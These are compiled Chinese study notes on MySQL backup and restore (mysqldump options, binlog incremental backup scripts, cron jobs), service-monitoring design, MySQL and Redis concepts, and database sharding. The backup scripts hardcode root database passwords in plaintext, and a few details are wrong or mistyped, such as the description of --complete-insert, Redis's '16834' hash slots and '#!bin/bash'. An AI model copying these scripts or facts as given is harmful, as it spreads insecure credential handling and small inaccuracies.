每日定时使用 MySQLadmin flush-logs来创建新日志，并结束前一日志写入过程。并把前一日志备份，例如上例中开始保存数据目录下的日志文件 MySQL-bin.000002 , ...

1.恢复完全备份
mysql -u root -p < backup_sunday_1_PM.sql

2.恢复增量备份
mysqlbinlog MySQL-bin.000002 … | MySQL -u root -p注意此次恢复过程亦会写入日志文件，如果数据量很大，建议先关闭日志功能

--compatible=name
它告诉 MySQLdump，导出的数据将和哪种数据库或哪个旧版本的 MySQL 服务器相兼容。值可以为 ansi、MySQL323、MySQL40、postgresql、oracle、mssql、db2、maxdb、no_key_options、no_tables_options、no_field_options 等，要使用几个值，用逗号将它们隔开。当然了，它并不保证能完全兼容，而是尽量兼容。

--complete-insert，-c
导出的数据采用包含字段名的完整 INSERT 方式，也就是把所有的值都写在一行。这么做能提高插入效率，但是可能会受到 max_allowed_packet 参数的影响而导致插入失败。因此，需要谨慎使用该参数，至少我不推荐。

--default-character-set=charset
指定导出数据时采用何种字符集，如果数据表不是采用默认的 latin1 字符集的话，那么导出时必须指定该选项，否则再次导入数据后将产生乱码问题。

--disable-keys
告诉 MySQLdump 在 INSERT 语句的开头和结尾增加 /*!40000 ALTER TABLE table DISABLE KEYS */; 和 /*!40000 ALTER TABLE table ENABLE KEYS */; 语句，这能大大提高插入语句的速度，因为它是在插入完所有数据后才重建索引的。该选项只适合 MyISAM 表。

--extended-insert = true|false
默认情况下，MySQLdump 开启 --complete-insert 模式，因此不想用它的的话，就使用本选项，设定它的值为 false 即可。

--hex-blob
使用十六进制格式导出二进制字符串字段。如果有二进制数据就必须使用本选项。影响到的字段类型有 BINARY、VARBINARY、BLOB。

--lock-all-tables，-x
在开始导出之前，提交请求锁定所有数据库中的所有表，以保证数据的一致性。这是一个全局读锁，并且自动关闭 --single-transaction 和 --lock-tables 选项。

--lock-tables
它和 --lock-all-tables 类似，不过是锁定当前导出的数据表，而不是一下子锁定全部库下的表。本选项只适用于 MyISAM 表，如果是 Innodb 表可以用 --single-transaction 选项。

--no-create-info，-t
只导出数据，而不添加 CREATE TABLE 语句。

--no-data，-d
不导出任何数据，只导出数据库表结构。
mysqldump --no-data --databases mydatabase1 mydatabase2 mydatabase3 > test.dump
将只备份表结构。--databases指示主机上要备份的数据库。

--opt
这只是一个快捷选项，等同于同时添加 --add-drop-tables --add-locking --create-option --disable-keys --extended-insert --lock-tables --quick --set-charset 选项。本选项能让 MySQLdump 很快的导出数据，并且导出的数据能很快导回。该选项默认开启，但可以用 --skip-opt 禁用。注意，如果运行 MySQLdump 没有指定 --quick 或 --opt 选项，则会将整个结果集放在内存中。如果导出大数据库的话可能会出现问题。

--quick，-q
该选项在导出大表时很有用，它强制 MySQLdump 从服务器查询取得记录直接输出而不是取得所有记录后将它们缓存到内存中。

--routines，-R
导出存储过程以及自定义函数。

--single-transaction
该选项在导出数据之前提交一个 BEGIN SQL语句，BEGIN 不会阻塞任何应用程序且能保证导出时数据库的一致性状态。它只适用于事务表，例如 InnoDB 和 BDB。本选项和 --lock-tables 选项是互斥的，因为 LOCK TABLES 会使任何挂起的事务隐含提交。要想导出大表的话，应结合使用 --quick 选项。

--triggers
同时导出触发器。该选项默认启用，用 --skip-triggers 禁用它。

跨主机备份
使用下面的命令可以将host1上的sourceDb复制到host2的targetDb，前提是host2主机上已经创建targetDb数据库：
-C 指示主机间的数据传输使用数据压缩
mysqldump --host=host1 --opt sourceDb| mysql --host=host2 -C targetDb

结合Linux的cron命令实现定时备份
比如需要在每天凌晨1:30备份某个主机上的所有数据库并压缩dump文件为gz格式
30 1 * * * mysqldump -u root -pPASSWORD --all-databases | gzip > /mnt/disk2/database_`date '+%m-%d-%Y'`.sql.gz

一个完整的Shell脚本备份MySQL数据库示例。比如备份数据库opspc
[root@test-huanqiu ~]# vim /root/backup.sh
#!bin/bash
echo "Begin backup mysql database"
mysqldump -u root -ppassword opspc > /home/backup/mysqlbackup-`date +%Y-%m-%d`.sql
echo "Your database backup successfully completed"

[root@test-huanqiu ~]# crontab -e
30 1 * * * /bin/bash -x /root/backup.sh > /dev/null 2>&1

mysqldump全量备份+mysqlbinlog二进制日志增量备份
1）从mysqldump备份文件恢复数据会丢失掉从备份点开始的更新数据，所以还需要结合mysqlbinlog二进制日志增量备份。
首先确保已开启binlog日志功能。在my.cnf中包含下面的配置以启用二进制日志：
[mysqld]
log-bin=mysql-bin

2）mysqldump命令必须带上--flush-logs选项以生成新的二进制日志文件：
mysqldump --single-transaction --flush-logs --master-data=2 > backup.sql
其中参数--master-data=[0|1|2]
0: 不记录
1：记录为CHANGE MASTER语句
2：记录为注释的CHANGE MASTER语句

mysqldump全量+增量备份方案的具体操作可参考下面两篇文档：
数据库误删除后的数据恢复操作说明
解说mysql之binlog日志以及利用binlog日志恢复数据

 

下面分享一下自己用过的mysqldump全量和增量备份脚本

 

应用场景：
1）增量备份在周一到周六凌晨3点，会复制mysql-bin.00000*到指定目录；
2）全量备份则使用mysqldump将所有的数据库导出，每周日凌晨3点执行，并会删除上周留下的mysq-bin.00000*，然后对mysql的备份操作会保留在bak.log文件中。

脚本实现：
1）全量备份脚本（假设mysql登录密码为123456；注意脚本中的命令路径）：

[root@test-huanqiu ~]# vim /root/Mysql-FullyBak.sh
#!/bin/bash
# Program
# use mysqldump to Fully backup mysql data per week!
# History
# Path
BakDir=/home/mysql/backup
LogFile=/home/mysql/backup/bak.log
Date=`date +%Y%m%d`
Begin=`date +"%Y年%m月%d日 %H:%M:%S"`
cd $BakDir
DumpFile=$Date.sql
GZDumpFile=$Date.sql.tgz
/usr/local/mysql/bin/mysqldump -uroot -p123456 --quick --events --all-databases --flush-logs --delete-master-logs --single-transaction > $DumpFile
/bin/tar -zvcf $GZDumpFile $DumpFile
/bin/rm $DumpFile
Last=`date +"%Y年%m月%d日 %H:%M:%S"`
echo 开始:$Begin 结束:$Last $GZDumpFile succ >> $LogFile
cd $BakDir/daily
/bin/rm -f *

2）增量备份脚本（脚本中mysql的数据存放路径是/home/mysql/data，具体根据自己的实际情况进行调整）
[root@test-huanqiu ~]# vim /root/Mysql-DailyBak.sh
#!/bin/bash
# Program
# use cp to backup mysql data everyday!
# History
# Path
BakDir=/home/mysql/backup/daily                     //增量备份时复制mysql-bin.00000*的目标目录，提前手动创建这个目录
BinDir=/home/mysql/data                                   //mysql的数据目录
LogFile=/home/mysql/backup/bak.log
BinFile=/home/mysql/data/mysql-bin.index           //mysql的index文件路径，放在数据目录下的
/usr/local/mysql/bin/mysqladmin -uroot -p123456 flush-logs
#这个是用于产生新的mysql-bin.00000*文件
Counter=`wc -l $BinFile |awk '{print $1}'`
NextNum=0
#这个for循环用于比对$Counter,$NextNum这两个值来确定文件是不是存在或最新的
for file in `cat $BinFile`
do
    base=`basename $file`
    #basename用于截取mysql-bin.00000*文件名，去掉./mysql-bin.000005前面的./
    NextNum=`expr $NextNum + 1`
    if [ $NextNum -eq $Counter ]
    then
        echo $base skip! >> $LogFile
    else
        dest=$BakDir/$base
        if(test -e $dest)
        #test -e用于检测目标文件是否存在，存在就写exist!到$LogFile去
        then
            echo $base exist! >> $LogFile
        else
            cp $BinDir/$base $BakDir
            echo $base copying >> $LogFile
         fi
     fi
done
echo `date +"%Y年%m月%d日 %H:%M:%S"` $Next Bakup succ! >> $LogFile

3）设置crontab任务，执行备份脚本。先执行的是增量备份脚本，然后执行的是全量备份脚本：
[root@test-huanqiu ~]# crontab -e
#每个星期日凌晨3:00执行完全备份脚本
0 3 * * 0 /bin/bash -x /root/Mysql-FullyBak.sh >/dev/null 2>&1
#周一到周六凌晨3:00做增量备份
0 3 * * 1-6 /bin/bash -x /root/Mysql-DailyBak.sh >/dev/null 2>&1

4）手动执行上面两个脚本，测试下备份效果
[root@test-huanqiu backup]# pwd
/home/mysql/backup
[root@test-huanqiu backup]# mkdir daily
[root@test-huanqiu backup]# ll
total 4
drwxr-xr-x. 2 root root 4096 Nov 29 11:29 daily
[root@test-huanqiu backup]# ll daily/
total 0

先执行增量备份脚本
[root@test-huanqiu backup]# sh /root/Mysql-DailyBak.sh
[root@test-huanqiu backup]# ll
total 8
-rw-r--r--. 1 root root 121 Nov 29 11:29 bak.log
drwxr-xr-x. 2 root root 4096 Nov 29 11:29 daily
[root@test-huanqiu backup]# ll daily/
total 8
-rw-r-----. 1 root root 152 Nov 29 11:29 mysql-binlog.000030
-rw-r-----. 1 root root 152 Nov 29 11:29 mysql-binlog.000031
[root@test-huanqiu backup]# cat bak.log
mysql-binlog.000030 copying
mysql-binlog.000031 copying
mysql-binlog.000032 skip!
2016年11月29日 11:29:32 Bakup succ!

然后执行全量备份脚本
[root@test-huanqiu backup]# sh /root/Mysql-FullyBak.sh
20161129.sql
[root@test-huanqiu backup]# ll
total 152
-rw-r--r--. 1 root root 145742 Nov 29 11:30 20161129.sql.tgz
-rw-r--r--. 1 root root 211 Nov 29 11:30 bak.log
drwxr-xr-x. 2 root root 4096 Nov 29 11:30 daily
[root@test-huanqiu backup]# ll daily/
total 0
[root@test-huanqiu backup]# cat bak.log
mysql-binlog.000030 copying
mysql-binlog.000031 copying
mysql-binlog.000032 skip!
2016年11月29日 11:29:32 Bakup succ!
开始:2016年11月29日 11:30:38 结束:2016年11月29日 11:30:38 20161129.sql.tgz succ

```

### 监控检查（分存活、服务可用两个维度）
```
https://zhuanlan.zhihu.com/p/27437421
1. 背景
此处所说的服务监控程序，是指通过模拟用户的请求，对一个系统的服务质量进行监控的程序。服务监控程序的主要目的是：从用户的角度，通过发送端到端的请求，确认系统对外提供的服务是否正常。

简单来说，一个好的服务监控程序应该具备以下功能：

检测服务是否存活
检测服务质量是否正常
检测服务质量的变化趋势
对每日的监控数据做统计报表
运维友好的
……
需要首先说明的是，监控一个系统服务是否正常是一个全方位的工作，需要进行如进程监控、请求错误率监控、网络流量监控，日志监控等工作。然而服务监控程序通常有着不可替代的作用，例如，通过将服务监控程序部署在用户的机器上，就可以从用户的角度对系统的服务质量进行监控，包括请求响应时间，请求错误率等等。

本文接下来首先分析在开发一个服务监控程序时需要考虑的方方面面，接着介绍在部署和运维一个服务监控程序的时候需要注意的问题。

2. 监控目标
要实现一个服务监控程序，首先需要明确要对服务可能出现的哪些异常情况进行监控，以下列举了一些可能出现的服务异常：

Dead – 服务已经挂掉（如进程异常退出，系统异常重启等）
Unreachable – 服务不可达（如DNS异常，网络中断等）
Unresponsive – 请求可以正常发送，但是服务无响应（如服务器内部异常等）
Slow – 服务可以正确响应，但是响应时间过长（如服务器过载等）
Wrong – 服务可以及时响应，但是结果不符合预期（如服务器内部数据库异常等）
……（以下还有很多异常）
对于以上的一些错误，如服务进程异常退出等，可以通过进程监控等及时发现。然而对于服务不可达，或者服务响应时间变长等，通常服务内部的监控并不能及时发现，此时就需要依赖服务监控程序。

部署服务监控程序的一个重要目标，就是当由于系统内部的错误、或者系统外部依赖的环境的异常导致用户的请求受到影响时，可以在短时间（1分钟）发现并及时处理。

同时，通过及时分析服务监控程序的请求记录，也可以对系统可能出现的瓶颈及时预警。举例来说：当服务监控程序的请求响应时间逐渐变长时，则说明系统可能需要扩容了。

3. 服务监控程序的实现
实现一个服务监控程序相对容易：只要模拟用户的请求发送到服务器，当请求超时或失败时则进行报警通知管理员即可。然而要实现一个好的监控程序，达到报警及时、准确——出问题时马上报警，不出问题不误报警，并不是一件容易的事情。

以下介绍实现一个好的服务监控程序时需要注意的一些问题。

3.1. 服务监控程序对系统的影响要尽量小

服务监控程序对被监控系统的影响要尽量小，被监控系统不能为了因为处理服务监控程序的探测请求而消耗太多资源，这里的资源包括：网络资源、计算资源、存储资源等。

举例来说，我们的对象存储服务对用户提供了以下功能：

用户可以向自己的存储空间中上传和下载对象
用户可以对一个图片对象进行图片处理相关操作（如裁剪，给图片加水印等）
用户可以对一个视频对象进行视频处理相关操作（如截取视频帧，视频转码等）
还提供了其他一些操作，如List自己存储空间中的对象，批量删除对象等操作
我们的每一种服务都由一个相对独立的集群提供：

上传下载服务有数据库和存储集群
图片处理服务有图片处理集群
视频处理服务有视频处理集群
我们的服务监控程序在实现时有以下考虑：

为了检测服务上传下载服务，需要模拟用户发送对象上传下载请求。这里要注意的是，上传下载的对象不能太大，原因有两个：一是服务器处理逻辑对于大对象和小对象是一样的；二是避免因为上传或下载一个大对象出现的网络波动或磁盘负载抖动。

为了检测图片处理服务，只需要对一个小图片进行最简单的图片处理即可。避免对一个大图片进行过于复杂的图片处理带来的CPU消耗。

为了检测视频处理服务，只需要发送对一个小视频截取第一帧的请求即可。如果截取一个大视频的任意帧，程序可能需要将整个视频全部读到本地才能完成，这会带来巨大的网络和磁盘开销。

我们实现的服务监控程序不会执行一些复杂的操作，如批量删除对象等。原因是批量删除对象实际上最终是调用删除单个对象的接口，而我们会在检测上传下载服务中对删除对象的接口进行调用（上传 -> 下载 -> 删除）。

这里所要强调的是：在写服务监控程序的时候，要明确需要如何监控自己的系统，并且用最小的代价来进行探测。

3.2. 及时发现系统异常

服务监控程序周期性地向被监控系统发送探测请求，为了能及时发现系统异常，这个探测周期就需要设置的足够小。然而若探测周期设置的过小，必然对被监控系统的影响会提高。因此需要根据被监控系统的具体情况来设定该周期。

例如对于我们的对象存储来说，文件读写是核心服务，而图片和视频处理是附加服务。因此对于核心的上传下载服务，探测周期均为1分钟一次，而图片和视频则可以将周期设置为5分钟。

这里所要强调的是：为了设置合理的探测周期，要能够对被监控系统的重要程度进行区分，根据不同的重要性来设置不同的探测周期。当然，如果探测请求对系统的影响很小，那么所有的探测请求设置的足够频繁也没有问题。

3.3. 精确报警

所谓精确报警，就是做到“系统正常不报警，系统异常必报警”，做到了这一点，那一旦运维人员收到相关的报警，则需要将该报警作为第一优先级立即进行处理。

此处有一个问题需要注意：即系统偶尔的小抖动（如网络丢包，或者系统偶尔负载提高导致响应时间变长等），不应该发送报警，而只需要记入日志并在次日发送邮件给运维人员即可。这就需要在开发服务监控程序时考虑相关的处理逻辑。

以下给出我们的服务监控程序探测上传下载服务的相关处理逻辑：

每分钟发送1次上传、下载、删除请求，判断请求返回值是否符合预期，同时记录每次请求的响应时间；
如果请求的返回值符合预期，且响应时间没有超过设置的阈值，则等待一分钟再次发送请求；否则，将错误信息记入日志，并执行第3步；
连续发送5次请求，并判断这5次请求的返回结果和执行时间。如果超过2次请求出错或超时，则发送报警，否则只记日志不发送报警。
该处理逻辑中所有的次数（包括发送请求次数，报警阈值等）均可以在配置文件中设置，保证运维人员可以根据实际情况配置合理的值。这种实现方式，可以有效防止偶发的错误造成的误报警。当然，对于那些出错的请求，需要好好进行分析。

3.4. 全面监控子系统

通常，一个服务由一个集群来提供，前端通过Openresty的负载均衡来将用户请求分发到该集群的各个工作节点。这里可能会出现的一个问题是：当一个工作节点出现异常时，前端用户的请求可能不会受到影响，然而系统的运维人员一定需要知道该信息。

我们的做法是，在给各个工作节点配置如进程监控，日志监控等常规监控的基础上，通过部署在内部某节点的服务监控程序将请求直接发送到该工作节点上，用于监控该节点的服务质量。

我们的服务监控程序同时监控了对象存储服务的外部域名、内部域名、前端Openresty的虚拟IP、真实IP，各个服务子节点的服务端口等。

3.5. 服务监控程序的监控

服务监控程序监控系统运行状况，然而作为一个服务本身，它的状态也应该被监控起来。否则，如果服务监控程序本身已经异常退出，则无法在系统故障时及时报警。

服务监控程序的监控需要从开发和运维两个方面进行保障，在这里先谈谈开发时需要考虑的因素：

要考虑运维误操作可能会kill掉服务监控程序，因此程序中需要捕获kill信号并发送报警或输出一条FATAL级别日志（用于日志监控）；
服务监控程序可以考虑提供HTTP访问接口，供外部程序监控服务监控程序的状态。当系统部署多套服务监控程序时，也可以利用该接口查看各个服务监控程序所在机器的服务质量；
……
3.6. 多重报警机制

当服务监控程序可以及时、精确发现服务异常时，需要通过短信报警（或邮件等其他报警）将问题告诉给系统运维人员。在开发时需要考虑服务监控程序需要提供至少两套报警机制，防止其中一种报警方式失灵的情况。

举例来说，服务监控程序至少可以采用以下几种方式进行报警：

直接调用公共的报警短信接口（如运维平台提供的Http接口）发送报警；
通过记录错误日志，进行日志监控，当日志中出现特定关键字时进行报警；
将监控的数据推送到统一的监控平台，在监控平台中实现逻辑判断和报警发送
3.7. 其他若干注意事项

以下再列举一些其他在开发服务监控程序时的注意事项：

报警信息要准确
发送报警信息很重要的一方面在于帮助开发和运维尽快定位问题，因此报警信息一定要准确。下面是一些推荐的报警信息：
“192.168.0.1上对象读写监控程序连续5次请求超时”
“10.10.0.138上的视频截图服务出现错误，错误信息为：...”
可以对配置文件进行动态reload
例如，如果服务监控程序有一个配置文件：hosts.conf，表示该监控程序需要探测的所有服务器地址。那当该配置文件修改时，程序可以在下次探测时去探测新加入的地址。这样减少了运维关闭服务监控程序和重启的操作，也就减小了出错的风险。
服务监控程序的重试
我们之前实现的服务监控程序，内部采用Java-SDK中提供的PutObject函数和GetObject等函数。这些函数在某些错误的情况下会进行重试，而这个重试很有可能导致屏蔽了某种可能的系统异常。
服务监控程序的日志
服务监控程序的日志也应该按照生产系统的标准，输出操作日志和错误日志等，规范的日志可以大大加速错误定位过程。
防止服务监控程序导致系统过载
在系统已经过载的情况下，请求可能被拒绝或超时。此时，当服务监控程序判断系统已经过载时，则发送报警。同时应该暂停（如暂停10分钟）向服务器发送探测请求，减轻系统负担。
将所有服务的监控都放在一个程序中
我们将所有服务的监控（上传下载、图片处理、视频处理）都集成在一套代码中，通过配置文件可以分别对各类监控进行配置。这样做的好处是：代码维护和运维成本低，因为只需要维护一套代码，部署一套代码即可。然而需要注意的是，所有的监控都部署在一台机器上，可能导致该机器的占用较多的带宽，因此需要特别注意采样数据不能太大。
服务监控程序的代码应该纳入版本管理
需要把服务监控程序作为整个系统的一个重要部分，进行代码的管理。
4. 服务监控程序的部署与运维
开发服务监控程序只走完了长征路的第一步，而剩下的两万五千里路都依赖服务的部署和运维。

以下介绍部署和运维服务监控程序的注意事项。

4.1. 多点部署

将服务监控程序进行多点部署至少有两个方面的目的：

服务监控程序的高可用——防止一台服务监控程序挂掉的情况
从用户角度监控服务——通过将服务监控程序部署在用户的服务器上，可以从用户的角度监控服务质量
多点部署也有以下问题需要注意：

服务监控程序必须能够支持多点部署，因此在开发的时候需要注意多个服务监控程序不能相互干扰；
部署在用户服务器上的监控程序要占用尽量少的资源，避免对用户本身的系统产生影响，在部署时也可以通过配置若干参数：如探测周期、探测请求数量等，降低服务监控程序占用资源；
4.2. 报警阈值调节

在开发服务监控程序时，需要尽量将所有的参数做成可配置参数，同时可以动态reload，如:

要监控哪些服务器
要监控哪类操作
监控周期是多少
每个监控周期发送多少请求
请求超时时间是多少
一次请求出错后要连续发送多少请求
报警接收人信息
……
而运维人员的工作是，需要根据被检测系统的实际情况设置这些参数，并且调节这些参数为一个合理的值。

参数调节应该遵循“先紧后松”的原则，即开始是可以将报警阈值设置的敏感一些，然后去分析每次报警，如果确认是误报，再将报警阈值调高一点。同时，及时不报警，也应该及时分析系统的错误日志，确保没有报警遗漏。

4.3. 报警可用性检查

所谓报警可用性检查，就是运维人员需要定期对服务监控程序的报警逻辑进行验证，确保这些报警都能正确发出并被相关人员接收。

验证报警可用性并不是一件容易的事情，因为有时候可能需要主动触发一些错误逻辑，这会使该验证过程耗时费力。因此在开发服务监控程序时，需要考虑如何给运维提供方便的可用性验证接口。

例如，可以在配置文件中设置一个字段testAlarm，当该字段设为true时，服务监控程序主动触发一些错误，例如对一个文本文件进行图片缩略操作，或者下载对象时指定一个错误的文件名等，这样便可以很方便的触发一次报警，用于验证报警可用性。

4.4. 报警处理

当接收到一条报警时，运维人员应该有相对应的报警处理流程，哪怕该流程是“执行ping操作验证网络是否联通，并通知服务监控程序所在服务器的相关产品方”。

有很多的文章强调报警必须要Actionable，即可被处理的报警。运维和开发需要一起确认哪些错误应该发送报警，而哪些错误只要计入日志或在次日邮件报表通知即可。如果在收到一条报警而无事可做，那设置该报警的意义不大。

4.5. 其他若干注意事项

以下再列举一些部署和运维服务监控程序时的注意事项：

任何一个报警，需要发给至少两个相关人员，且有一个主要负责人员
发给至少两个人，是为了确保报警不会被遗漏；而发给相关人员，是为了防止非相关人员因为经常收到与自己无关的报警短信而忽略了发给自己的重要报警短信。
服务监控程序的上线流程
服务监控程序也需要执行完整的从开发到测试到部署上线的流程。尽管服务监控程序只是一个外部程序，然而我们通常会在内网部署让它可以将请求直接发送到后端各个子节点，因此也存在一定的风险，顾需要严格按照上线流程执行。

```

### MySQL、Redis、Memcached Proxy 、Cluster 目的、原理
```
https://www.cnblogs.com/hnlmy/p/9997515.html
数据库
数据库设计
 a. 单表
 b. FK（单表；一张表存储时，如果有重复出现的字段为了防止硬盘的浪费，所以做一个FK；去掉FK变成单表（这样子访问速度快了））
 c. M2M（多对多关系）
    
 到底是什么关系？
        单选的下拉框/radio FK；多选下拉框/checkbox M2M    
举个小例子：

复制代码
问题：员工信息表员工当前薪资；保留员工的所有的调薪记录。
思路一：两张表
            员工表：
                id  name salary 
                
            调薪：
                id  price  time  员工ID 
                  
思路二：三张表
             员工表：
                id  name salary 
                
             调薪：
                id  price  time 
                
                
            员工调薪表：
                id   uid   sid
复制代码
基本SQL
分组(group by)
select depart_id,count(1),max(salary),min(age),sum(age) from user group by depart_id
select depart_id,count(1),max(salary),min(age),sum(age) from user group by depart_id having count(1)>5
注意事项：

通过聚合条件group by然后进行筛选的用having不能用where
连表
inner join / left join / right join
inner join是保留两个共有的，如果一个没有就不保留。
left join 是以左表为主表，如果右表没数据，则为null
right join 是以右表为主表，如果左表没数据，则为null
举个小例子：

复制代码
数据：
            部门表：
                id   title 
                1      销售
                2      运营
                3      IT
                
            用户表：
                id          name        部门id
                1           x1          1
                2           x2          1
                3           x3          1
                4           x4          1
                5           x5          1
复制代码
复制代码
     请问查到多少条数据？
            select * from userinfo left join depart on userinfo.did = depart.id    5
        
            select * from depart left join userinfo on userinfo.did = depart.id    7
        
            select * from userinfo inner join depart on userinfo.did = depart.id   5
        
            select * from depart inner join userinfo on userinfo.did = depart.id   5
复制代码
MySQL数据库引擎以及区别？
复制代码
a. 常见innodb、mysiam
b. 区别：
            - innodb：
                - 支持事务（特性：原子性、一致性、隔离性、持久性）
                  事务就是（要完成都完成，要不完成就回滚）
                - 表锁
                - 行锁
            - mysiam
                - 不支持事务
                - 表锁
                - 全文索引
                - 速度快                
复制代码
复制代码
补充：
            原生SQL
                begin;
                
                select * from xxx  for update;
                
                update ...
                
                commit;
            
            django:
                    
                with trancation.automic:
                    User.objects.filter().select_for_update()
复制代码
应用场景：商品数据计数。
索引
复制代码
作用：
        - 加速查找
        - 约束
    种类：
        - 索引：随便写
        - 唯一索引：允许Null + 不重复
        - 主键索引：不允许Null + 不重复
        
        - 联合索引：多列组成一个索引
        - 联合唯一索引：多列组成一个索引 + 唯一
            例如：
                name  email  pwd 
                
         命中索引遵循最左前缀的原则： name、name  email、name pwd、name  email  pw
复制代码
复制代码
补充：
        - 覆盖索引，当查找数据时候在索引表中就可以获取数据，无需去数据表中查找。
                    select name from user where name='xxx'
        - 索引合并, 使用多个单列索引进行查找。
                    select * from user where name='xx' email='xx'
                    
    
    为什么索引快？
        因为在索引结构中讲述按照B+来进行存放的数据。
复制代码
优化数据库方案
复制代码
    a. 索引。
    b. 固定长度的字段写在前面。
            id  name  age < id  age name
    c. 对于固定选择的内容：性别，可以将其对应关系保存在内存中。
    d. 分表
            - 垂直分分，将数据分割到N张表。
            - 水平分分，将列分到到N种表。
    e. 分库 
    f. 读写分离（主从复制）
        主：读写
        从：读        
            
        
        在django中的应用：
            models.Users.objects.filter(id=2).using('default')
            models.Users.objects.filter(id=2).using('db1')
    g. limit 
        select * from tb where name='alex' limit 1;
        
    h. 缓存
        将常用数据读取到redis中（缓存），读取速度快。
        
复制代码
char和varchar的区别。
char是定长，不变的。
varchar是变长，可变的。
char 速度快，但是占空间。
varchar速度慢，但是省内存
视图、触发器、存储过程、函数
视图：视图是一个虚拟表（非真实存在），其本质是【根据SQL语句获取动态的数据集，并为其命名】，用户使用时只需使用【名称】即可获取结果集，并可以将其当作表来使用。
存储过程是一个SQL语句集合，当主动去调用存储过程时，其中内部的SQL语句会按照逻辑执行。
mysql自定义函数就是实现程序员需要sql逻辑处理，参数是IN参数,含有RETURNS字句用来指定函数的返回类型，而且函数体必须包含一个RETURN value语句。
触发器：对某个表进行【增/删/改】操作的前后如果希望触发某个特定的行为时，可以使用触发器，触发器用于定制用户对表的行进行【增/删/改】前后的行为。
事务用于将某些操作的多个SQL作为原子性操作，一旦有某一个出现错误，即可回滚到原来的状态，从而保证数据库数据完整性。
创建了引之后一定要命中索引
复制代码
    - like '%xx'
        select * from tb1 where name like '%cn';
    - 使用函数
        select * from tb1 where reverse(name) = 'wupeiqi';
    - or
        select * from tb1 where nid = 1 or email = 'seven@live.com';
        特别的：当or条件中有未建立索引的列才失效，以下会走索引
                select * from tb1 where nid = 1 or name = 'seven';
                select * from tb1 where nid = 1 or email = 'seven@live.com' and name = 'alex'
    - 类型不一致
        如果列是字符串类型，传入条件是必须用引号引起来，不然...
        select * from tb1 where name = 999;
    - !=
        select * from tb1 where name != 'alex'
        特别的：如果是主键，则还是会走索引
            select * from tb1 where nid != 123
    - >
        select * from tb1 where name > 'alex'
        特别的：如果是主键或索引是整数类型，则还是会走索引
            select * from tb1 where nid > 123
            select * from tb1 where num > 123
    - order by
        select email from tb1 order by name desc;
        当根据索引排序时候，选择的映射如果不是索引，则不走索引
        特别的：如果对主键排序，则还是走索引：
            select * from tb1 order by nid desc;
     
    - 组合索引最左前缀
        如果组合索引为：(name,email)
        name and email       -- 使用索引
        name                 -- 使用索引
        email                -- 不使用索引
复制代码
数据库对比
关系型数据库和非关系型数据库：
关系型数据库：MySQL、SQLite、SQLServer、access、oracle、db2 
非关系型数据库：redis、memcached、mongodb
持久化存到文件中：
MySQL、SQLite、mongodb、SQLServer、access、oracle、db2 
持久化存到内存中的是：
redis、memcached
redis和memcached的区别？
相同点：都是将数据保存到内存，存取速度都比较快。 自己想：在内存中存在一个大字典，你对字典进行操作。
复制代码
不同点：
    - 数据类型：
                - redis，5大数据类型
                    {
                        k1:v1,
                        k2:[11,22],
                        k3:{
                            kk1:vv1,
                            kk2:vv2,
                        },
                        k4: {1,2,3},
                        k5: {('alex',8),('oldboy',5)}
                        
                    }
                - memcached，1中类型：字符串
                    {
                        k1:v1,
                    }
    - 持久化
                - redis，支持持久化
                - memcached，不支持。
     - 集群架构
                - redis，支持
                - memcached，不支持。
     - 自动过期策略
                - redis，支持
                    voltile-lru：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰

                    volatile-ttl：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰
                    
                    volatile-random：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰
                    
                    allkeys-lru：从数据集（server.db[i].dict）中挑选最近最少使用的数据淘汰
                    
                    allkeys-random：从数据集（server.db[i].dict）中任意选择数据淘汰
                    
                    no-enviction（驱逐）：禁止驱逐数据
                - memcached，不支持。
复制代码
redis持久化的两种方式
- AOF,记录下用户所有执行的命令。然后如果宕机了，或者出故障了，直接按照记录下的用户的命令就可以保持数据完整了。（恢复时间慢，但是数据能够保持完整）
- RDB,定时持久化。就是过一段时间保存一次（恢复时间快，但是数据不一定完整）
redis默认支持主从复制
主ip只用在配置文件中写上slaveof就行
redis的高可用（sentinel）哨兵
自动检测主服务器是否正常
哨兵的作用简单来说就是（主redis和复redis，主redis挂掉之后，哨兵会自动检测到，然后都连上哨兵，哨兵会自动检测谁死谁活，这就是哨兵的作用，另外哨兵尽量设置三个，如果因为网络原因或者遇到特殊情况的话，三个哨兵会以半数以上的方式决定这个redis是否宕机）
redis分布式（cluster）
 - redis cluster
 - codis 
 - Twemproxy
redis中默认有16834个哈希槽
redis分布式锁
连接所有的redis服务器，在服务器上设置 k1 = 随机字符串； 成功一半以上，表示获得锁。
其他人来，也会设置，但是设置时会成功 < 一半； 表示未获取锁，等待。
超时，锁自动释放。
释放锁；连接所有服务器删除 k1=原来设置的随机字符串 ；而且删除的时候不是执行命令，而是删除的是lua脚本，（因为脚本效率高）

```

### 分片
```
https://www.cnblogs.com/qcloud1001/p/10405281.html
Introduction 导言
任何看到显著增长的应用程序或网站，最终都需要进行扩展，以适应流量的增加。以确保数据安全性和完整性的方式进行扩展，对于数据驱动的应用程序和网站来说十分重要。人们可能很难预测某个网站或应用程序的流行程度，也很难预测这种流行程度会持续多久，这就是为什么有些机构选择“可动态扩展的”数据库架构的原因。

在这篇概念性文章中，我们将讨论一种“可动态扩展的”数据库架构：分片数据库。近年来，分片（Sharding）一直受到很多关注，但许多人并没有清楚地了解它是什么，或者对数据库进行分片可能有意义的场景。我们将讨论分片是什么，它的一些主要优点和缺点，以及一些常见的分片方法。

下方是本文目录，帮助您接下来的阅读

img

What is Sharding? 什么是分片？
分片（Sharding）是一种与水平切分（horizontal partitioning）相关的数据库架构模式——将一个表里面的行，分成多个不同的表的做法（称为分区）。每个区都具有相同的模式和列，但每个表有完全不同的行。同样，每个分区中保存的数据都是唯一的，并且与其他分区中保存的数据无关。

从水平切分（horizontal partitioning）与垂直切分（vertical partitioning）的关系，可能会有所帮助。在垂直切分表中，所有的列被分离出来，并放入新的不同的表中。每个垂直切分内的数据，独立于所有其他分区中的数据，并且每个分区都包含不同的行和列。下图说明了如何在水平和垂直方向上对表进行分区：

img

添加描述

分片（Sharding）将一个数据分成两个或多个较小的块，称为逻辑分片（logical shards）。然后，逻辑分片（logical shards）分布在单独的数据库节点上，称为物理分片（physical shards）。物理分片（physical shards）可以容纳多个逻辑分片（logical shards）。尽管如此，所有分片中保存的数据，共同代表整个逻辑数据集。

